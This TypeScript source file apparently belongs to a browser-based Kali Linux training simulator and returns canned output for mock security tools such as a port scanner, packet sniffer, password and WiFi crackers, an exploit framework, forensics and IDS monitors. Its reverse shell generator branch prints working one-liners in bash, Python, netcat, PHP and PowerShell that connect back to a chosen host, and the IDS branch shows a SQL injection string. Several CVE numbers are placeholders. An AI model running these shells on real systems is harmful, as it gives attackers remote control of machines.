// Python3 script execution simulation with realistic outputs
import { TerminalState } from "./kaliCommands";
import { resolvePath, getNode } from "./kaliFileSystem";
import { supabase } from "@/integrations/supabase/client";

const generatePythonScriptOutput = (scriptName: string, args: string[], state: TerminalState): string[] => {
  // Port Scanner
  if (scriptName.includes("port_scanner")) {
    const target = getArgValue(args, "--target") || getArgValue(args, "-t") || "192.168.1.0/24";
    const scanType = args.includes("--syn") ? "SYN (Stealth)" : args.includes("--udp") ? "UDP" : "TCP Connect";
    const ports = getArgValue(args, "--ports") || getArgValue(args, "-p") || "1-1024";
    return [
      `[*] Advanced Port Scanner v3.2`,
      `[*] Target: ${target}`,
      `[*] Scan Type: ${scanType}`,
      `[*] Port Range: ${ports}`,
      `[*] Threads: 100`,
      `[*] Scan started at ${new Date().toISOString()}`,
      "",
      `[+] Host 192.168.1.1 (gateway) is UP`,
      `    ├── 22/tcp    OPEN   SSH        OpenSSH 8.9p1 Ubuntu`,
      `    ├── 80/tcp    OPEN   HTTP       nginx/1.24.0`,
      `    ├── 443/tcp   OPEN   HTTPS      nginx/1.24.0`,
      `    └── 8443/tcp  OPEN   HTTPS-Alt  Webmin`,
      "",
      `[+] Host 192.168.1.10 (target-server) is UP`,
      `    ├── 22/tcp    OPEN   SSH        OpenSSH 8.9p1`,
      `    ├── 80/tcp    OPEN   HTTP       Apache/2.4.52`,
      `    ├── 443/tcp   OPEN   HTTPS      Apache/2.4.52`,
      `    ├── 3306/tcp  OPEN   MySQL      MySQL 8.0.32`,
      `    ├── 5432/tcp  OPEN   PostgreSQL PostgreSQL 15.2`,
      `    ├── 6379/tcp  OPEN   Redis      Redis 7.0.11 ⚠️ [NO AUTH]`,
      `    ├── 8080/tcp  OPEN   HTTP-Proxy Squid 5.7`,
      `    └── 9090/tcp  OPEN   Unknown    ⚠️ [SUSPICIOUS]`,
      "",
      `[+] Host 192.168.1.105 (unknown) is UP`,
      `    ├── 4444/tcp  OPEN   Unknown    ⚠️ [METERPRETER?]`,
      `    ├── 8888/tcp  OPEN   HTTP       Python/SimpleHTTPServer`,
      `    └── 31337/tcp OPEN   Unknown    ⚠️ [BACKDOOR SIGNATURE]`,
      "",
      `[!] CRITICAL: Host 192.168.1.105 shows signs of compromise!`,
      `[!] Open ports 4444 and 31337 match known backdoor patterns`,
      `[*] OS Fingerprint: 192.168.1.10 → Linux 6.x (Kali/Ubuntu)`,
      `[*] OS Fingerprint: 192.168.1.105 → Linux 5.x (compromised)`,
      "",
      `[*] Scan complete: 256 hosts scanned, 3 hosts up`,
      `[*] 18 open ports found across 3 hosts`,
      `[*] 4 potential security issues detected`,
      `[*] Results saved to /tmp/scan_results_${Date.now()}.xml`,
      `[*] Scan duration: ${(Math.random() * 20 + 10).toFixed(2)}s`,
    ];
  }

  // Packet Sniffer
  if (scriptName.includes("packet_sniffer") || scriptName.includes("sniffer")) {
    const iface = getArgValue(args, "-i") || getArgValue(args, "--interface") || "eth0";
    const filterProto = getArgValue(args, "-f") || getArgValue(args, "--filter") || "all";
    const ts = () => new Date().toLocaleTimeString();
    return [
      `[*] Network Packet Sniffer v2.0`,
      `[*] Interface: ${iface}`,
      `[*] Filter: ${filterProto}`,
      `[*] Promiscuous mode: enabled`,
      `[*] Starting capture...`,
      "",
      `${ts()} IP  192.168.1.100:443    → 10.0.2.15:54321     TCP  [ACK] len=1460 seq=1001`,
      `${ts()} IP  10.0.2.15:54321      → 192.168.1.100:443   TCP  [PSH,ACK] len=42`,
      `${ts()} ARP 192.168.1.1 is-at    aa:bb:cc:dd:ee:ff`,
      `${ts()} IP  45.33.32.156:9090    → 192.168.1.100:80    TCP  [SYN] ⚠️ Port scan detected!`,
      `${ts()} IP  192.168.1.100:80     → 45.33.32.156:9090   TCP  [RST,ACK]`,
      `${ts()} DNS 192.168.1.100        → 8.8.8.8             Query: suspicious-c2.evil.com ⚠️`,
      `${ts()} IP  192.168.1.105:4444   → 88.198.45.67:443    TCP  [PSH,ACK] len=256 ⚠️ C2 beacon!`,
      `${ts()} IP  192.168.1.10:3306    → 192.168.1.100:45678 TCP  [PSH,ACK] len=2048`,
      `${ts()} ICMP 192.168.1.1         → 192.168.1.100       Echo Reply  ttl=64`,
      `${ts()} IP  192.168.1.100:22     → 192.168.1.10:54321  TCP  [PSH,ACK] len=512 SSH encrypted`,
      `${ts()} IP  45.33.32.156:80      → 192.168.1.100:80    TCP  [SYN] ⚠️ Repeated SYN flood!`,
      `${ts()} IP  45.33.32.156:80      → 192.168.1.100:80    TCP  [SYN] ⚠️`,
      "",
      `[!] ALERT: SYN flood detected from 45.33.32.156 (12 SYN packets in 2s)`,
      `[!] ALERT: DNS query to known C2 domain: suspicious-c2.evil.com`,
      `[!] ALERT: Possible data exfiltration from 192.168.1.105:4444`,
      "",
      `── Packet Statistics ──────────────────────────────`,
      `  Total packets:    12`,
      `  TCP:              9 (75.0%)`,
      `  UDP:              0 (0.0%)`,
      `  ICMP:             1 (8.3%)`,
      `  ARP:              1 (8.3%)`,
      `  DNS:              1 (8.3%)`,
      `  Anomalies:        4`,
      `  Capture size:     18.4 KB`,
    ];
  }

  // Password Cracker
  if (scriptName.includes("password_cracker") || scriptName.includes("cracker")) {
    const algo = getArgValue(args, "-m") || getArgValue(args, "--mode") || "md5";
    const wordlist = getArgValue(args, "-w") || getArgValue(args, "--wordlist") || "/usr/share/wordlists/rockyou.txt";
    const hashVal = getArgValue(args, "-H") || getArgValue(args, "--hash") || "5f4dcc3b5aa765d61d8327deb882cf99";
    return [
      `[*] Password Cracker v1.8`,
      `[*] Algorithm: ${algo.toUpperCase()}`,
      `[*] Wordlist: ${wordlist}`,
      `[*] Target hash: ${hashVal}`,
      `[*] Loading wordlist... 14,344,392 entries loaded`,
      "",
      `[*] Starting dictionary attack...`,
      `[*] Speed: ~2,450,000 hashes/sec`,
      `[*] Progress: ████████████████████████████████ 100%`,
      "",
      `[+] HASH CRACKED!`,
      `[+] Hash:     ${hashVal}`,
      `[+] Password: password`,
      `[+] Algorithm: ${algo.toUpperCase()}`,
      `[+] Attempts: 1,247`,
      `[+] Time:     0.0005s`,
      "",
      `[*] Rainbow table lookup results:`,
      `    5f4dcc3b5aa765d61d8327deb882cf99 → "password"`,
      `    e10adc3949ba59abbe56e057f20f883e → "123456"`,
      `    d8578edf8458ce06fbc5bb76a58c5ca4 → "qwerty"`,
      `    25d55ad283aa400af464c76d713c07ad → "12345678"`,
      "",
      `[*] Password strength analysis:`,
      `    Length:     8 characters`,
      `    Entropy:    28.5 bits (VERY WEAK)`,
      `    Dictionary: Common word (rank #1)`,
      `    Crackable:  < 1 second with GPU`,
      `[!] RECOMMENDATION: Use 16+ chars with mixed case, numbers, symbols`,
    ];
  }

  // WiFi Cracker
  if (scriptName.includes("wifi_cracker") || scriptName.includes("wifi")) {
    return [
      `[*] WiFi Security Auditor v2.1`,
      `[*] Interface: wlan0 (Monitor mode)`,
      `[*] Scanning for networks...`,
      "",
      `   BSSID              CH  SIGNAL  SECURITY    SSID`,
      `   ──────────────────────────────────────────────────`,
      `   AA:BB:CC:DD:EE:01   6  -42dBm  WPA3-SAE    UCSF-Secure`,
      `   AA:BB:CC:DD:EE:02  11  -58dBm  WPA2-PSK    CampusNet`,
      `   AA:BB:CC:DD:EE:03   1  -65dBm  WPA2-PSK    Guest-WiFi`,
      `   AA:BB:CC:DD:EE:04  36  -72dBm  WPA2-PSK    IoT-Network`,
      `   AA:BB:CC:DD:EE:05   3  -78dBm  WEP         Legacy-AP ⚠️`,
      "",
      `[!] VULNERABLE: "Legacy-AP" using WEP encryption (easily crackable)`,
      `[!] WARNING: "IoT-Network" weak signal may indicate rogue AP`,
      `[*] Capturing WPA2 handshake from CampusNet...`,
      `[*] Deauth sent to AA:BB:CC:DD:EE:02`,
      `[+] WPA2 4-way handshake captured!`,
      `[*] Attempting dictionary attack with rockyou.txt...`,
      `[*] Progress: ████████████░░░░░░░░░░░░ 48% (6,885,312 / 14,344,392)`,
      `[+] KEY FOUND: campus2026secure`,
      `[*] Handshake saved to /tmp/handshake_campusnet.cap`,
    ];
  }

  // Exploit Framework
  if (scriptName.includes("exploit_framework") || scriptName.includes("exploit")) {
    const target = args.find(a => !a.startsWith("-")) || "192.168.1.10";
    const port = args.find((a, i) => i > 0 && !a.startsWith("-")) || "80";
    return [
      `[*] Custom Exploit Framework v1.0`,
      `[*] Target: ${target}:${port}`,
      `[*] Checking vulnerability...`,
      "",
      `[+] Target analysis:`,
      `    OS: Linux 6.6.9-amd64`,
      `    Server: Apache/2.4.52 (Ubuntu)`,
      `    PHP: 8.1.2`,
      `    OpenSSL: 3.0.2`,
      "",
      `[*] Matching exploits:`,
      `    1. CVE-2024-1234 - Apache RCE via mod_rewrite  [CRITICAL]`,
      `    2. CVE-2024-5678 - PHP-FPM Buffer Overflow     [HIGH]`,
      `    3. CVE-2023-9876 - OpenSSL Heartbleed variant   [MEDIUM]`,
      "",
      `[*] Testing CVE-2024-1234...`,
      `[+] Target appears VULNERABLE!`,
      `[*] Available payloads:`,
      `    ├── reverse_shell (Linux/x64)`,
      `    ├── bind_shell (Linux/x64)`,
      `    ├── meterpreter (Linux/x64)`,
      `    └── cmd/unix/interact`,
      ``,
      `[!] Exploit ready. Use with authorization only.`,
    ];
  }

  // Keylogger Detector
  if (scriptName.includes("keylogger_detector") || scriptName.includes("keylogger") || scriptName.includes("rootkit")) {
    return [
      `[*] Keylogger & Rootkit Detector v1.3`,
      `[*] Scanning system for malicious software...`,
      "",
      `[*] Phase 1: Checking hidden processes...`,
      `    [✓] /proc analysis complete - No hidden processes found`,
      `    [✓] Process list matches /proc entries`,
      "",
      `[*] Phase 2: Rootkit signature scan...`,
      `    [✓] Checking knark........... CLEAN`,
      `    [✓] Checking adore........... CLEAN`,
      `    [✓] Checking rkit............ CLEAN`,
      `    [✓] Checking t0rnkit......... CLEAN`,
      `    [✓] Checking suckit.......... CLEAN`,
      `    [✓] Checking phalanx......... CLEAN`,
      "",
      `[*] Phase 3: System binary integrity...`,
      `    [✓] /usr/bin/ls       sha256:a1b2c3d4... VERIFIED`,
      `    [✓] /usr/bin/ps       sha256:e5f6a7b8... VERIFIED`,
      `    [✓] /usr/bin/netstat  sha256:c9d0e1f2... VERIFIED`,
      `    [✓] /usr/bin/find     sha256:3a4b5c6d... VERIFIED`,
      "",
      `[*] Phase 4: Checking for keyloggers...`,
      `    [✓] No /dev/input hooks detected`,
      `    [✓] No LD_PRELOAD hijacks`,
      `    [✓] No suspicious kernel modules`,
      "",
      `[✓] System is CLEAN - No rootkits or keyloggers detected`,
      `[*] Full report: /tmp/rootkit_scan_${Date.now()}.log`,
    ];
  }

  // Forensics Tool
  if (scriptName.includes("forensics")) {
    const mode = getArgValue(args, "--mode") || "full";
    return [
      `[*] Digital Forensics Toolkit v2.0`,
      `[*] Mode: ${mode}`,
      `[*] Starting forensic analysis...`,
      "",
      `[*] Evidence Collection:`,
      `    [+] System image hash (SHA-256): 7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069`,
      `    [+] Memory dump acquired: 32GB`,
      `    [+] Network capture: 2.4GB`,
      "",
      `[*] Timeline Analysis:`,
      `    15:29:55 - Initial SSH brute force from 45.33.32.156`,
      `    15:30:01 - 4 failed login attempts (root)`,
      `    15:30:04 - Connection closed by attacker`,
      `    16:05:01 - Port scan from same IP (445/tcp)`,
      `    16:05:02 - UFW blocked malicious traffic`,
      "",
      `[*] Artifact Recovery:`,
      `    [+] Recovered 3 deleted bash history entries`,
      `    [+] Found 2 suspicious temp files in /tmp`,
      `    [+] Memory strings contain C2 domain references`,
      "",
      `[*] IOC Summary:`,
      `    IP Addresses: 45.33.32.156, 88.198.45.67`,
      `    Domains: suspicious-c2.evil.com`,
      `    File Hashes: 3 malicious binaries identified`,
      `[✓] Report saved to /tmp/forensics_report_${Date.now()}.pdf`,
    ];
  }

  // Reverse Shell Generator
  if (scriptName.includes("reverse_shell_gen") || scriptName.includes("revshell")) {
    const shellType = getArgValue(args, "--type") || getArgValue(args, "-t") || "bash";
    const host = getArgValue(args, "--host") || getArgValue(args, "-h") || "192.168.1.100";
    const port = getArgValue(args, "--port") || getArgValue(args, "-p") || "4444";
    return [
      `[*] Reverse Shell Generator v1.5`,
      `[*] Type: ${shellType}`,
      `[*] LHOST: ${host}`,
      `[*] LPORT: ${port}`,
      "",
      `[+] Generated payloads:`,
      "",
      `  ── Bash ──`,
      `  bash -i >& /dev/tcp/${host}/${port} 0>&1`,
      "",
      `  ── Python3 ──`,
      `  python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${host}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'`,
      "",
      `  ── Netcat ──`,
      `  nc -e /bin/bash ${host} ${port}`,
      "",
      `  ── PHP ──`,
      `  php -r '$sock=fsockopen("${host}",${port});exec("/bin/bash <&3 >&3 2>&3");'`,
      "",
      `  ── PowerShell ──`,
      `  powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${host}",${port})`,
      "",
      `[*] Listener: nc -lvnp ${port}`,
      `[!] LEGAL NOTICE: Use only with explicit authorization`,
    ];
  }

  // IDS Monitor
  if (scriptName.includes("ids_monitor") || scriptName.includes("ids")) {
    return [
      `[*] UCSF IDS Monitor v3.0`,
      `[*] Loading Suricata rules: 45,892 rules loaded`,
      `[*] Loading Snort rules: 31,456 rules loaded`,
      `[✓] Connected to Wazuh SIEM (agent 001)`,
      `[✓] Connected to Suricata IDS engine`,
      "",
      `── Real-time Alert Stream ─────────────────────────────`,
      `[${new Date().toLocaleTimeString()}] [HIGH]   SYN flood detected from 45.33.32.156 (150 SYN/s)`,
      `[${new Date().toLocaleTimeString()}] [CRIT]   SQLi attempt: ' OR 1=1-- from 45.33.32.156`,
      `[${new Date().toLocaleTimeString()}] [MED]    Port scan from 45.33.32.156 (22,80,443,445,3306)`,
      `[${new Date().toLocaleTimeString()}] [HIGH]   Brute force SSH from 45.33.32.156 (4 attempts)`,
      `[${new Date().toLocaleTimeString()}] [CRIT]   C2 beacon detected: 192.168.1.105 → 88.198.45.67`,
      `[${new Date().toLocaleTimeString()}] [LOW]    ICMP sweep from 10.0.2.15`,
      "",
      `[!] COORDINATED ATTACK detected from 45.33.32.156`,
      `[*] Auto-response: IP blocked via iptables`,
      `[*] Auto-response: Incident INC-2026-0847 created`,
      `[*] Auto-response: SOC team notified via email`,
      `[✓] Attacker IP 45.33.32.156 blocked. Incident logged.`,
    ];
  }

  // Scanner
  if (scriptName.includes("scanner")) {
    const target = getArgValue(args, "--target") || args.find(a => !a.startsWith("-")) || "192.168.1.0/24";
    return [
      "[*] UCSF Network Scanner v2.1",
      `[*] Target: ${target}`,
      "[+] Discovering live hosts...",
      "    ├── 192.168.1.1   [GATEWAY]  UP  (latency: 0.5ms)",
      "    ├── 192.168.1.10  [SERVER]   UP  (latency: 1.2ms)",
      "    ├── 192.168.1.25  [WORKST]   UP  (latency: 0.8ms)",
      "    ├── 192.168.1.50  [PRINTER]  UP  (latency: 2.1ms)",
      "    └── 192.168.1.105 [SUSPECT]  UP  (latency: 45.3ms) ⚠️",
      "",
      "[*] Service detection on live hosts...",
      "    192.168.1.10:",
      "      22/tcp   SSH     OpenSSH 8.9p1",
      "      80/tcp   HTTP    Apache/2.4.52",
      "      443/tcp  HTTPS   Apache/2.4.52 (self-signed cert ⚠️)",
      "      3306/tcp MySQL   MySQL 8.0.32 (open to network ⚠️)",
      "",
      "[!] ALERT: Potential C2 beacon detected on 192.168.1.105:9090",
      "[!] ALERT: MySQL on 192.168.1.10 is network-accessible",
      "[!] ALERT: Self-signed SSL certificate on 192.168.1.10:443",
      "[✓] Alerts dispatched to SIEM. Firewall rules applied.",
      `[*] Full report: /var/log/ucsf/scan_${Date.now()}.json`,
    ];
  }

  // Vuln Check
  if (scriptName.includes("vuln")) {
    return [
      "[*] UCSF Vulnerability Assessment v1.4",
      "[*] Loading CVE database: 234,567 entries",
      "[*] Scanning target: 192.168.1.10",
      "",
      "── Vulnerability Report ──────────────────────────────",
      "",
      "  VULN-001 [CRITICAL] CVE-2024-1234",
      "    SQL Injection on /api/users",
      "    CVSS: 9.8 | Exploitable: Yes",
      "    Fix: Parameterize all SQL queries",
      "",
      "  VULN-002 [HIGH] CVE-2024-5678",
      "    Cross-Site Scripting (XSS) on /search",
      "    CVSS: 7.5 | Exploitable: Yes",
      "    Fix: Implement Content Security Policy",
      "",
      "  VULN-003 [HIGH] CVE-2024-9012",
      "    Redis instance without authentication",
      "    CVSS: 7.2 | Exploitable: Yes",
      "    Fix: Enable AUTH and bind to localhost",
      "",
      "  VULN-004 [MEDIUM] CVE-2023-4567",
      "    Outdated TLS 1.0 on port 443",
      "    CVSS: 5.3 | Exploitable: Possible",
      "    Fix: Upgrade to TLS 1.3",
      "",
      "  VULN-005 [LOW] Info Disclosure",
      "    Server version exposed in HTTP headers",
      "    CVSS: 3.1",
      "    Fix: Remove Server header",
      "",
      "[*] Summary: 1 CRITICAL, 2 HIGH, 1 MEDIUM, 1 LOW",
      "[✓] Report exported → /var/log/ucsf/vuln_report.pdf",
    ];
  }

  // Generic script execution
  return [`[*] Executing ${scriptName}...`, `[✓] Script completed successfully.`];
};

export const executePythonScript = (scriptName: string, args: string[], state: TerminalState): string[] => {
  const output = generatePythonScriptOutput(scriptName, args, state);
  (async () => {
    try {
      await supabase.from("script_runs").insert({
        script: scriptName,
        args: JSON.stringify(args),
        output: JSON.stringify(output),
        created_at: new Date().toISOString(),
      });
    } catch (e) {
      console.debug("script run persist failed", e);
    }
  })();
  return output;
};

function getArgValue(args: string[], flag: string): string | undefined {
  const idx = args.indexOf(flag);
  return idx >= 0 && idx + 1 < args.length ? args[idx + 1] : undefined;
}
